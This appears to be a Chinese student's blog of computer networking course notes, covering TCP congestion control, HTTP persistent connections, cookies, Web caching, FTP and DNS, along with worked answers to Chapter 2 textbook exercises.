<h4 id="拥塞避免"><a class="markdownIt-Anchor" href="#拥塞避免"></a> 拥塞避免</h4>
<p>收到3个重复ACK时将CongWin减为原来的一半，线性增大拥塞窗口。<br />
超时事件发生时，<font color=red>门限值设置为当前CongWin的一半</font>（门限值初始值为65KB，即16MSS）<br />
将CongWin设置为1个MSS大小。<br />
窗口以指数速度增大，增大到门限值之后再以线性速度增大。</p>
<p><img src="https://img-blog.csdnimg.cn/311bb6a3c348419bad5fff90f72e0299.png" alt="" /></p>
<p>总结：</p>
<ul>
<li>当拥塞窗口CongWin小于门限值ssthresh时，发送方处于慢启动阶段，窗口以指数速度增大。</li>
<li>当拥塞窗口CongWin大于门限值时，发送方处于拥塞避免阶段，窗口线性增大。</li>
<li>当收到3个重复ACK时，门限值设置为拥塞窗口的1/2，而拥塞窗口CongWin设置为门限值。</li>
<li>当超时事件发生时，门限值设置为拥塞窗口的1/2，而拥塞窗口CongWin设为1个MSS。</li>
</ul>
<h4 id="tcp的吞吐量"><a class="markdownIt-Anchor" href="#tcp的吞吐量"></a> TCP的吞吐量</h4>
<p>平均而言，吞吐量是丢包率L的函数：</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mn>1.22</mn><mo>×</mo><mi>M</mi><mi>S</mi><mi>S</mi></mrow><mrow><mi>R</mi><mi>T</mi><mi>T</mi><msqrt><mi>L</mi></msqrt></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{1.22\times MSS}{RTT\sqrt{L}}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.29033em;vertical-align:-0.93em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.1833349999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9266650000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal">L</span></span></span><span style="top:-2.886665em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.11333499999999996em;"><span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">.</span><span class="mord">2</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<h3 id="371-公平性"><a class="markdownIt-Anchor" href="#371-公平性"></a> 3.7.1 公平性</h3>
<p>目标：如果K个TCP连接共享同一个带宽为R的瓶颈链路，每个连接的平均传输速率为R/K。</p>
<p><img src="https://img-blog.csdnimg.cn/8a1c4b2e4b224eceac03f23399846015.png" alt="" /></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC2%E7%AB%A0%E4%B9%A0%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC2%E7%AB%A0%E4%B9%A0%E9%A2%98/" class="post-title-link" itemprop="url">计算机网络——第2章习题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-02 23:45:36 / 修改时间：23:46:04" itemprop="dateCreated datePublished" datetime="2023-03-02T23:45:36+08:00">2023-03-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">计算机网络</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="课后习题和问题"><a class="markdownIt-Anchor" href="#课后习题和问题"></a> 课后习题和问题</h2>
<h3 id="21"><a class="markdownIt-Anchor" href="#21"></a> 2.1</h3>
<ol>
<li>web应用：使用HTTP协议<br />
文件传输应用：使用FTP协议<br />
邮件应用：SMTP协议<br />
P2P应用：BitTorrent协议<br />
远程登录：telnet协议</li>
<li>网络体系结构指的是网络5层结构，应用程序体系结构由应用程序研发者设计，规定了如何在各种端系统上组织该应用程序，含P2P体系结构和CS结构。</li>
<li>对于两个进程的通信会话，先发起对话的是客户，另外一个是服务器。</li>
<li>不同意，通信会话的两方一定一方是客户，一方是服务器，只是P2P应用下一台主机在不同的通信会话中可能是不同的角色，而CS模型中的服务器一般是固定的某些主机。</li>
<li>IP地址+端口号可以唯一确定当前主机所在网络中的一个进程。</li>
<li>UDP，UDP虽然不可靠但速度比TCP快。</li>
<li>实时社交软件</li>
<li>可靠数据传输：TCP协议保证<br />
吞吐量要求：都不保证<br />
定时：都不保证<br />
安全性：都不保证</li>
<li>应用层，UDP不能使用SSL。</li>
</ol>
<h3 id="22~24"><a class="markdownIt-Anchor" href="#22~24"></a> 2.2~2.4</h3>
<ol start="10">
<li>握手协议是指主要用来让客户端及服务器确认彼此的身份的一类网络协议。</li>
<li>因为HTTP、SMTP和POP3都是要求数据完全正确没有错误的，而TCP可以保证数据正确，但UDP不行。</li>
<li>当用户首次访问该网站时，该网站向用户发送一个独特的cookie，在用户下单时，cookie随着下单请求发送到用户，服务器由此确定发起这个请求的是哪一个用户，并记录这条购买记录。</li>
<li>Web缓存器会保存最近请求的对象，当未来再一次请求该对象时可以直接调出来，减少对象的请求，以减少接收被请求对象的时延。只是减少其中某些对象的时延，对于缓存中没有的对象，还是需要进行常规的请求，不会减少其时延。</li>
<li>略</li>
<li>略</li>
<li>略</li>
<li>略</li>
<li>邮件不考</li>
<li>邮件不考</li>
<li>略</li>
</ol>
<h2 id="习题"><a class="markdownIt-Anchor" href="#习题"></a> 习题</h2>
<ol>
<li>a. 错误，请求一些文本和3幅图像组成的Web页面，其本质还是Web图像，形式为HTTP报文，因此接收的是1个响应报文。注意<font color=red>无论是采用非持续连接还是持续连接，一个请求报文一定对应一个响应报文，不请求是不会有响应的，唯一的区别就是连接的建立和断开。对于本题而言，如果使用持续连接，那么在连接断开之前客户端还会发送3个请求给服务器请求那3幅图像。</font><br />
b.  正确，因为两个地址的域名相同，因此服务器相同，可以通过一个连接发送数据。<br />
c. 错误，在非持续连接中，一个TCP连接只能发送一个请求和一个响应。<br />
d. 错误，Date指的是服务器产生并发送该响应报文的日期和时间。<br />
e. 错误，HTTP请求可以有空报文体。</li>
<li>略</li>
<li>还需要DNS（应用层）、UDP（运输层）、TCP（运输层）。注意DNS服务使用UDP报文段封装。</li>
<li>a. <a target="_blank" rel="noopener" href="http://gaia.cs.umass.edu">gaia.cs.umass.edu</a><br />
b. 1.1<br />
c. 持续连接<br />
d. 在报文段中没有找到<br />
e. Mozilla/5.0(Windows;U; Windows NT 5.1; en-US; rv:1.7.2)对于不同的浏览器，服务器可能会返回不同的内容。</li>
<li>a. 能，因为请求码为200 OK，提供回答的时间为Tue, 07 Mar 2008 12:39:45 GMT（注意下面还有一个Last-Modified字段表示上一次修改的日期，不一样）<br />
b. Sat 10 Dec 2005 18:27:46<br />
c. 3874（Content-Length字段）<br />
d. &lt;!doc，同意持续连接。</li>
<li>略</li>
<li>RTT<sub>1</sub>到RTT<sub>n</sub>的和加上2倍的RTT<sub>0</sub>，因为客户端与服务器连接还需要1个RTT。</li>
<li>a. 在没有并行TCP连接的非持续HTTP中，8个对象需要建立8次连接，共16RTT。<br />
b. 对于配置有5个并行连接的HTTP，8个对象需要建立8次连接，注意需要首先建立连接请求主要的页面，才能够并行请求对象，因此额外的时间为4RTT。<br />
c. 对于持续HTTP，不需要建立另外的连接，额外的时间为8RTT。</li>
<li>a. 平均接入时延=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi mathvariant="normal">Δ</mi><mrow><mn>1</mn><mo>−</mo><mi mathvariant="normal">Δ</mi><mi>β</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\Delta}{1-\Delta\beta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3534389999999998em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mtight">Δ</span><span class="mord mathnormal mtight" style="margin-right:0.05278em;">β</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">Δ</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span>是跨越接入链路发送一个对象的平均时间，也即一个对象的传输时延=850Kb/15Mb/s=0.0567s，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span>是对象对该接入链路的平均到达率，即16请求/s，故平均接入时延=0.61s，平均互联网时延为3s，故总响应时间为3.61s。<br />
b. 缓存器的命中率为0.4，命中时只会有机构内网的传输时延，即0.0085s。平均响应时间为0.0085×0.4+3.61×0.6=1.8754s。</li>
<li>10米的短链路可以忽略传播时延，150bps对于200比特长的控制分组的传输时延为1.33s，如果是非持续连接非并行连接，那么RTT=2.67s，一共需要11次连接和11次数据传输，一共需要传输33个控制分组和11个数据分组，总时间为7377s。如果是并行连接，使用N个并行连接，每个连接的带宽为150/Nbps，传输的数据相同，因此总时间依然为7377s。如果是持续连接，非并行连接，一共需要1次连接和11次数据传输，传输13个控制分组和11个数据分组，总时间为7351s。持续连接和非持续连接对时延的影响不大。</li>
<li>a. 是，并行连接可以让Bob获得更多的带宽。<br />
b. 是。</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC2%E7%AB%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC2%E7%AB%A0/" class="post-title-link" itemprop="url">计算机网络——第2章</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-02 23:44:57 / 修改时间：23:45:32" itemprop="dateCreated datePublished" datetime="2023-03-02T23:44:57+08:00">2023-03-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">计算机网络</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="chapter-2-应用层"><a class="markdownIt-Anchor" href="#chapter-2-应用层"></a> Chapter 2 应用层</h1>
<h2 id="21-应用层协议原理"><a class="markdownIt-Anchor" href="#21-应用层协议原理"></a> 2.1 应用层协议原理</h2>
<p>网络应用可能有很多需求，如运行在不同端系统，通过网络进行交流等。网络应用不需要运行在网络核心设备上。</p>
<p>网络应用使用多种架构：客户端/服务器架构（C/S）、对等网（P2P）、混合体系结构。</p>
<h4 id="客户机-服务器体系结构"><a class="markdownIt-Anchor" href="#客户机-服务器体系结构"></a> 客户机-服务器体系结构</h4>
<p>服务器端总是打开，拥有一个相对固定的地址（一般固定），具有缩放的数据中心。<br />
客户端与服务器通信，可能是间歇性连接，可能有动态的IP地址，客户端之间不能相互通信。</p>
<h4 id="p2p体系结构"><a class="markdownIt-Anchor" href="#p2p体系结构"></a> P2P体系结构</h4>
<ul>
<li>客户端不一定总是在线</li>
<li>结点之间可以相互通信</li>
<li>结点的地址以及他们之间的连接可能随时发生变化</li>
<li>任何一方既可以提供服务又可以享受服务</li>
<li>结点之间是间歇性连接，地址也是变化的</li>
<li>管理非常复杂</li>
</ul>
<h4 id="混合体系结构"><a class="markdownIt-Anchor" href="#混合体系结构"></a> 混合体系结构</h4>
<p>混合体系结构将C/S模式与P2P模式结合起来，广泛应用于即时通信中，当双方在线需要传输文件时可以使用P2P模式，当有一方不在线时可以使用C/S模式首先将文件上传到服务器，然后另一方下载。</p>
<h3 id="212-进程通信"><a class="markdownIt-Anchor" href="#212-进程通信"></a> 2.1.2 进程通信</h3>
<p>进程：在端系统运行的程序，操作系统术语，<font color=red>一个程序可能产生多个进程。同一台主机上的不同多个进程之间采用内部进程通信方式（由操作系统决定），而不同主机之间的进程通信采用报文交换方式（应用层协议）。</font>客户端和服务器的通信实际上是进程和进程之间的通信，客户端进程需要启动通信，服务器进程需要等待连接。</p>
<p>应用层协议定义了：交换的报文类型、各种报文类型的语法、字段的语义、进程何时如何发送报文以及对报文进行响应、开放的允许交互的协议、专有协议（如QQ自己定义的报文格式）</p>
<p>注意<font color=red>应用层协议≠网络应用</font>。网络应用的本质是进程，而应用层协议只是进程和进程之间的通信方式。</p>
<h4 id="套接字"><a class="markdownIt-Anchor" href="#套接字"></a> 套接字</h4>
<p>每一个网络应用进程都有一个属于自己的套接字，该套接字在整个因特网上独一无二。其中包含有：</p>
<ul>
<li>主机地址：表示该网络应用进程运行在因特网哪一个主机上，通常使用32位IP地址进行标识。</li>
<li>端口地址：在该主机表示该网络应用进程，通常使用16位的端口号进行标识。</li>
<li>套接字的长度为48位。</li>
</ul>
<p>进程通过套接字来接收和发送报文，套接字相当于一个接口，依赖接口另一边的传输基础设施来投递数据到接收进程的套接字。<font color=red>主机IP地址和进程相关的端口号标识因特网上的进程，且为唯一标识。</font></p>
<h3 id="213-可供应用程序使用的运输服务"><a class="markdownIt-Anchor" href="#213-可供应用程序使用的运输服务"></a> 2.1.3 可供应用程序使用的运输服务</h3>
<p>不同的应用程序对网络有不同的需求，不同的需求对应的网络要求不同。</p>
<ul>
<li>文件传输、email、Web网页要求数据必须完全不能出错，带宽可以有弹性要求，不要求实时性</li>
<li>实时音频和视频、交互式游戏允许数据的一定量丢失，但带宽有要求，且实时性要求很高</li>
<li>存储音频和视频允许数据的一定量丢失，实时性要求低于实时，但也有一定要求。</li>
<li>即时讯息要求数据不丢失，实时性可能有可能无。</li>
</ul>
<h4 id="tcp协议"><a class="markdownIt-Anchor" href="#tcp协议"></a> TCP协议</h4>
<ul>
<li>面向连接，服务器和客户端需要建立连接</li>
<li>可靠传输，在发送和接收进程之间</li>
<li>流量控制，发送数据的速度绝不超过接收的速度</li>
<li>拥塞控制，当网络超负荷时，束紧发送端口，减缓发送速度</li>
<li>不提供：实时性和最小带宽承诺</li>
</ul>
<h4 id="udp协议"><a class="markdownIt-Anchor" href="#udp协议"></a> UDP协议</h4>
<ul>
<li>在客户端和服务器进程之间实现不可靠的传输</li>
<li>不提供：连接建立、可靠性保证、流量控制、拥塞控制、实时性、最小带宽承诺</li>
</ul>
<h4 id="安全性"><a class="markdownIt-Anchor" href="#安全性"></a> 安全性</h4>
<p>两个协议都不提供安全性，需要添加安全套接字SSL，其提供加密的TCP连接，并有数据的完整性检查和端点身份鉴别。SSL位于应用层和TCP之间。</p>
<h2 id="22-web和http"><a class="markdownIt-Anchor" href="#22-web和http"></a> 2.2 Web和Http</h2>
<p>Web（C/S模式）的构成：</p>
<ul>
<li>Web服务器：IIS、Apache、TomCat等</li>
<li>浏览器：IE、Maxthon、Firefox等</li>
<li>协议：信息表达的协议为HTML，信息传输的协议为HTTP</li>
</ul>
<p>Web页面由一些对象组成，对象可以是HTML，JPEG图片、音频文件等<br />
HTML文件是Web页面的基础，可以包括各种对象，是一个容器对象<br />
任何一个对象都可以使用URL来定位。</p>
<p>客户端：浏览器请求、接收、展示Web对象。<br />
服务器：Web服务器发送对象对请求进行响应。</p>
<h3 id="221-http协议概况"><a class="markdownIt-Anchor" href="#221-http协议概况"></a> 2.2.1 HTTP协议概况</h3>
<p>HTTP协议的特点：</p>
<ul>
<li>TCP传输服务：客户端启动TCP连接到服务器，端口80。</li>
<li>服务器接收来自客户端的TCP连接。</li>
<li>HTTP报文在浏览器和Web服务器之间进行交换。</li>
<li>关闭TCP连接。</li>
<li>HTTP连接无状态，服务器不保留任何访问过的请求信息。</li>
</ul>
<h3 id="221-持续性连接和非持续性连接"><a class="markdownIt-Anchor" href="#221-持续性连接和非持续性连接"></a> 2.2.1 持续性连接和非持续性连接</h3>
<p>HTTP连接分为<font color=red>非持续性连接和持续性连接</font>两种。非持续性连接通过TCP连接最多发送1个对象，下载多个对象时需要建立多个连接。持续性连接通过单个TCP连接可以发送多个对象。HTTP1.0的传输模式就是非持久性连接。当客户端接收到第一个HTTP对象发现其中还有引用的对象时，会再一次开启TCP连接逐一接收这些对象。</p>
<p><font color=red>定义往返时间RTT：</font>一个短分组从客户到服务器然后再返回到客户所花费的时间。</p>
<p>因此在非持续性连接中获取一个对象需要2RTTs，第一个建立连接，第二个请求资源。总时间=2RTTs+文件传输时间。在非持续性连接中只能通过多个浏览器同时打开多个并行的连接来改善性能。</p>
<p>在HTTP1.1时即使用了持久连接，服务器在发送相应后不再断开TCP连接，而是保持该连接，用于后续对象的传送，直至该连接“休息”了一个较长的时间之后方断开该连接。持久连接减少了服务器端连接数的需要，从而减少了对服务器端套接字资源的占用，提高了服务器的负载能力。持久连接分为<font color=red>非流水线模式和流水线模式</font>。非流水线方式是一个对象传输完成之后方能传输下一个，流水线模式可以一次性发送所有请求，慢慢接收。</p>
<h3 id="223-http报文格式"><a class="markdownIt-Anchor" href="#223-http报文格式"></a> 2.2.3 HTTP报文格式</h3>
<p>HTTP请求报文包括：</p>
<ul>
<li>请求行：标识该报文的请求方式，包含GET、POST、HEAD、PUT、DELETE共5种。其中绝大多数为GET和POST。</li>
<li>首部诸行，包含如主机、解析浏览器、编码、语言等信息（每行结束为\r\n表示换行）</li>
<li>单独一行回车、换行标识报文首部结束</li>
<li>对象内容，数据</li>
</ul>
<h4 id="http请求行定义的方法"><a class="markdownIt-Anchor" href="#http请求行定义的方法"></a> HTTP请求行定义的方法</h4>
<ul>
<li>GET请求用于向服务器请求指定URL的对象</li>
<li>POST请求用于向服务器提交表单数据，也可以同时请求一个Web页面。注意可以不使用POST方法二使用GET方法发送表单数据以获得新的Web页面</li>
<li>HEAD请求用于从服务器返回相应报文，但是该报文中并不包含请求的对象，常用于故障跟踪</li>
<li>PUT请求将上传的文件放在实体主体字段中，目标路径由URL字段标明</li>
<li>DELETE请求删除URL字段中指定的文件。</li>
</ul>
<p>上面的前3种为HTTP1.0支持，下面2种为HTTP1.1新支持。上传数据除了可以使用PUT请求外也可以使用GET请求将需要上传的数据发送到URL中。</p>
<h4 id="http请求报文首部状态码"><a class="markdownIt-Anchor" href="#http请求报文首部状态码"></a> HTTP请求报文首部状态码</h4>
<p>HTTP请求有一个状态码位于第一行，标识HTTP请求的状态。常见的请求码：</p>
<ul>
<li>200：OK，请求成功，被请求的对象就在报文中</li>
<li>301：Moved Permanently，被请求的对象移动过，新的位置在报文中有说明（Location: 开头的行）</li>
<li>400：Bad Request，服务器不明白报文的意思（4开头都是客户端的问题）</li>
<li>505：HTTP Version Not Supported，服务器不支持报文使用的HTTP协议版本（5开头都是服务器的问题）</li>
</ul>
<h3 id="224-用户与服务器的交互cookie"><a class="markdownIt-Anchor" href="#224-用户与服务器的交互cookie"></a> 2.2.4 用户与服务器的交互：Cookie</h3>
<p>Web站点使用Cookie的目的有：</p>
<ul>
<li>限制用户的访问</li>
<li>将内容和用户身份进行关联</li>
</ul>
<p>Cookie技术组成部分：</p>
<ul>
<li>在HTTP响应报文之中有一个Cookie首部行</li>
<li>在HTTP请求报文中也有一个Cookie首部行</li>
<li>在用户端系统中保留一个Cookie文件，由用户浏览器负责管理</li>
<li>在Web站点有一个后端数据库</li>
</ul>
<p>客户端将保存的某个网站的Cookie放在HTTP请求头中，发送到对应的网站，网站发现请求报文中含有Cookie便会进行查找，找到Cookie后网站将Cookie对应到特定的用户中，返回个性化的内容。</p>
<h3 id="225-web缓存"><a class="markdownIt-Anchor" href="#225-web缓存"></a> 2.2.5 Web缓存</h3>
<p>缓存的目的：</p>
<ul>
<li>加速客户端访问Web界面的速度，减少时延</li>
<li>减少局域网与外部因特网交换的数据量，从而在达到同等服务质量的同时，可以使用较小的网络带宽，节约费用。</li>
</ul>
<p>如果需要频繁从一个内网中访问外部某一个网站的数据，那么会对出口带宽造成很大的挑战。但如果在机构内部假设缓存服务器，那么这些对象的访问只需要在内网即可实现，不仅能够减少对外链路的压力，还能够降低时延。</p>
<h3 id="226-条件get方法"><a class="markdownIt-Anchor" href="#226-条件get方法"></a> 2.2.6 条件GET方法</h3>
<p>目的：更新Web缓存中的Web对象副本。<br />
缓存服务器向网站发送条件GET请求用于确认内容是否被更新，如果没有更新，则服务器返回304报文编码，表示内容没有被更新。如果已经更新，则返回一个普通的带有对象的HTTP报文，其中头部有一行为Last-Modified。</p>
<h3 id="227-ftp协议"><a class="markdownIt-Anchor" href="#227-ftp协议"></a> 2.2.7 FTP协议</h3>
<p>FTP协议使用TCP协议传输数据，采用C/S模式，端口号为21/20<br />
与HTTP的比较：</p>
<ul>
<li>都使用TCP协议</li>
<li>FTP的控制信息带外传送，而HTTP的控制信息带内传送。FTP有两个并行连接，控制连接21端口发送控制信息，数据连接20端口发送数据信息。</li>
</ul>
<blockquote>
<p>有些传输层协议具有带外(Out Of Band, OOB)数据的概念，用于迅速告知对方本端发生的重要事件。因此带外数据比普通数据(也称为带内数据)有更高的优先级，不论发送缓冲区中是否有排队等待发送的普通数据，带外数据总是被立即发送。带外数据的传输可以使用一条独立的传输层连接，也可以映射到传输层普通数据的连接中。但是在实际应用中，带外数据的使用少见，已知的仅有telnet、ftp等远程非活跃程序。<br />
  UDP没有实现带外数据传输，TCP也没有真正意义上的带外数据。但是TCP利用其头部中的紧急指针标志(URG)和紧急指针两个字段，为应用程序提供了一种紧急方式。TCP紧急方式是利用传输普通数据的连接来传输紧急数据的，这种紧急数据的含义类似于带外数据。<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29344757/article/details/78689925">https://blog.csdn.net/qq_29344757/article/details/78689925</a></p>
</blockquote>
<ul>
<li>HTTP连接无状态，而FTP连接有状态，FTP服务器会在整个会话期间维持用户状态信息。</li>
</ul>
<p>常见的FTP命令</p>
<ul>
<li>USER username 登录</li>
<li>PASS password 登录</li>
<li>LIST 返回当前目录中的文件列表</li>
<li>RETR filename 取文件</li>
<li>STOR filename 传文件</li>
</ul>
<p>常见FTP应答：</p>
<ul>
<li>331 Username OK，password required</li>
<li>125 data connection already open; transfer starting</li>
<li>425 cannot open data connection</li>
<li>452 error writing file</li>
</ul>
<h2 id="24-dns因特网的目录服务"><a class="markdownIt-Anchor" href="#24-dns因特网的目录服务"></a> 2.4 DNS：因特网的目录服务</h2>
<p>为记忆方面，发明了DNS系统用于IP地址和域名的转换。</p>
<h3 id="241-dns提供的服务"><a class="markdownIt-Anchor" href="#241-dns提供的服务"></a> 2.4.1 DNS提供的服务</h3>
<ul>
<li>DNS是一个分布式数据库，由很多台DNS服务器按照层次结构组织起来</li>
<li>DNS运行在端到端系统上，且使用UDP协议（53号端口）进行报文传输，因此其为应用层协议</li>
<li>以C/S模式工作</li>
<li>不直接展示在用户面前，是Internet的核心功能</li>
</ul>
<h3 id="242-dns工作原理概述"><a class="markdownIt-Anchor" href="#242-dns工作原理概述"></a> 2.4.2 DNS工作原理概述</h3>
<p>用户在浏览器输入一个域名后：</p>
<ul>
<li>浏览器从URL中取出域名，将其传送给DNS客户机</li>
<li>DNS客户机向DNS服务器发出一个包含域名的查询请求报文</li>
